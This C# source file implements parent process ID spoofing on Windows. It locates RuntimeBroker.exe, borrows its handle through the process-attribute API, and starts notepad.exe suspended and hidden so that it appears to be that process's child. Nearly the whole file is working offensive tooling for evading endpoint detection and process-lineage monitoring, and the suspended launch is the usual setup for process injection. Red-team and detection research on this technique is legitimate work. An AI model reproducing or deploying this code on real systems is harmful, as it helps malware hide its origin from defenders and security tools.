using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;

namespace PPIDSpoofing
{
    class Program
    {
        static int GetParentPID(string procName)
        {
            IntPtr hSnapshot = IntPtr.Zero;
            int ppid = 0;

            try
            {
                IntPtr hParent = IntPtr.Zero; ;
                PROCESSENTRY32 procEntry = new PROCESSENTRY32();
                procEntry.dwSize = (UInt32)Marshal.SizeOf(typeof(PROCESSENTRY32));
                hSnapshot = CreateToolhelp32Snapshot(SnapshotFlags.Process, 0);
                if (Process32First(hSnapshot, ref procEntry))
                {
                    do
                    {
                        //Console.WriteLine("[*] process: {0}", procEntry.szExeFile);
                        if (procName == procEntry.szExeFile)
                        {
                            ppid = (int)procEntry.th32ProcessID;
                            Console.WriteLine("[+] Process found - PID: {0}", ppid);
                            break;
                        }
                    } while (Process32Next(hSnapshot, ref procEntry));
                }
                else
                {
                    throw new ApplicationException(string.Format("[-] Error code: {0}", Marshal.GetLastWin32Error()));
                }

            }
            catch (Exception ex)
            {
                throw new Exception(string.Format("[-] PPID Finding failed: {0}", ex.Message));
            }
            finally
            {
                CloseHandle(hSnapshot);
            }

            return ppid;

        }

        static void Main(string[] args)
        {
            string childPath = @"C:\windows\system32\notepad.exe";
            int ppid = GetParentPID("RuntimeBroker.exe");

            var procSecAttributes = new SECURITY_ATTRIBUTES();
            var threadSecAttributes = new SECURITY_ATTRIBUTES();
            procSecAttributes.nLength = Marshal.SizeOf(procSecAttributes);
            threadSecAttributes.nLength = Marshal.SizeOf(threadSecAttributes);

            var siEx = new STARTUPINFOEX();
            siEx.StartupInfo.cb = (UInt32)Marshal.SizeOf(new STARTUPINFOEX());
            var pInfo = new PROCESS_INFORMATION();
            IntPtr lpSize = IntPtr.Zero;

            // 1. "First, call this function with dwAttributeCount parameter set to maximum number of attributes" - MSDN 
            // Initialize with 1 attribute, since we are only changing: PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
            var rIPTALone = InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
            siEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);

            // 2. Allocate enough space for data in lpAttribute buffer - MSDN. And call the function again to initialize the buffer.
            // Here, we are only changing 1 attribute. So siEx.lpAttributeList was allocated with size of 1 Intptr.Size. 
            bool rIPTAL = InitializeProcThreadAttributeList(siEx.lpAttributeList, 1, 0, ref lpSize);

            // 3. Obtain handle of the parent process 
            IntPtr hParentProc = OpenProcess((uint)(ProcessAccessFlags.DuplicateHandle | ProcessAccessFlags.CreateProcess), false, (uint)ppid);

            // 4. UpdateProcThreadAttribute. Specify which attribute to be changed (PROC_THREAD_ATTRIBUTE_PARENT_PROCESS).
            // Then, specify the pointer to the value that's going to be changed - i.e) the handle to the fake parent process (hParentProc)
            IntPtr lpValuePointer = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteIntPtr(lpValuePointer, hParentProc);

            var rUPTA = UpdateProcThreadAttribute(
                siEx.lpAttributeList,
                (uint)0,
                (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                lpValuePointer,
                (IntPtr)IntPtr.Size,
                IntPtr.Zero,
                IntPtr.Zero);

            // 5. CreateProcess using spoofed siEx 
            siEx.StartupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
            siEx.StartupInfo.wShowWindow = SW_HIDE;

            try
            {
                var rCP = CreateProcess(
                    childPath,
                    null,
                    ref procSecAttributes,
                    ref threadSecAttributes,
                    false,
                    CreateSuspended | EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
                    IntPtr.Zero,
                    null,
                    ref siEx,
                    out pInfo
                    );

                if (!rCP)
                {
                    Console.WriteLine("[-] Error code: {0}", Marshal.GetLastWin32Error());
                }

                Console.WriteLine("[*] Create Process result: {0}", rCP.ToString());
            }
            catch (Exception ex)
            {
                throw new Exception(string.Format("[-] PPID Finding failed: {0}", ex.Message));
            }

            Console.WriteLine("[+] InitializeProcThreadAttributeList one: {0}", rIPTALone.ToString());
            Console.WriteLine("[+] InitializeProcThreadAttributeList two: {0}", rIPTAL.ToString());
            Console.WriteLine("[+] Parent Process handle: {0}", hParentProc.ToInt64().ToString("x2"));
            Console.WriteLine("[+] lpValuePointer = {0}", lpValuePointer.ToInt64().ToString("x2"));
            Console.WriteLine("[+] UpdateProcThreadAttribute result: {0}", rUPTA.ToString());
            Console.WriteLine("[+] Spawning {0} with pid: {1}", childPath, pInfo.dwProcessId);
            Console.WriteLine("[+] Spoofed pid: {0}", ppid);
            Console.ReadLine();
        }

        //  ============================ PInvoke - Ignore me ============================

        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }
        [Flags]
        private enum SnapshotFlags : uint
        {
            HeapList = 0x00000001,
            Process = 0x00000002,
            Thread = 0x00000004,
            Module = 0x00000008,
            Module32 = 0x00000010,
            Inherit = 0x80000000,
            All = 0x0000001F,
            NoHeaps = 0x40000000
        }

        [StructLayout(LayoutKind.Sequential)]
        //internal struct STARTUPINFO
        public struct STARTUPINFO
        {
            public uint cb;
            IntPtr lpReserved;
            IntPtr lpDesktop;
            IntPtr lpTitle;
            uint dwX;
            uint dwY;
            uint dwXSize;
            uint dwYSize;
            uint dwXCountChars;
            uint dwYCountChars;
            uint dwFillAttributes;
            public uint dwFlags;
            public ushort wShowWindow;
            ushort cbReserved;
            IntPtr lpReserved2;
            IntPtr hStdInput;
            IntPtr hStdOutput;
            IntPtr hStdErr;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct LARGE_INTEGER
        {
            public uint LowPart;
            public int HighPart;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESSENTRY32
        {
            public uint dwSize;
            public uint cntUsage;
            public uint th32ProcessID;
            public IntPtr th32DefaultHeapID;
            public uint th32ModuleID;
            public uint cntThreads;
            public uint th32ParentProcessID;
            public int pcPriClassBase;
            public uint dwFlags;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)] public string szExeFile;
        };

        public const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
        public const int STARTF_USESTDHANDLES = 0x00000100;
        public const int STARTF_USESHOWWINDOW = 0x00000001;
        public const ushort SW_HIDE = 0x0000;
        public const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
        public const uint CREATE_NO_WINDOW = 0x08000000;
        public const uint CreateSuspended = 0x00000004;

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool CreateProcess(
           string lpApplicationName,
           string lpCommandLine,
           ref SECURITY_ATTRIBUTES lpProcessAttributes,
           ref SECURITY_ATTRIBUTES lpThreadAttributes,
           bool bInheritHandles,
           uint dwCreationFlags,
           IntPtr lpEnvironment,
           string lpCurrentDirectory,
           [In] ref STARTUPINFOEX lpStartupInfo,
           out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
        [SuppressUnmanagedCodeSecurity]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll")]
        static extern bool Process32Next(
            IntPtr hSnapshot,
            ref PROCESSENTRY32 lppe);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateToolhelp32Snapshot(
            SnapshotFlags dwFlags,
            uint th32ProcessID);

        [DllImport("kernel32.dll")]
        static extern bool Process32First(
            IntPtr hSnapshot,
            ref PROCESSENTRY32 lppe);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool InitializeProcThreadAttributeList(
             IntPtr lpAttributeList,
             int dwAttributeCount,
             int dwFlags,
             ref IntPtr lpSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
             uint processAccess,
             bool bInheritHandle,
             uint processId);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool UpdateProcThreadAttribute(
              IntPtr lpAttributeList,
              uint dwFlags,
              IntPtr Attribute,
              IntPtr lpValue,
              IntPtr cbSize,
              IntPtr lpPreviousValue,
              IntPtr lpReturnSize);
    }
}
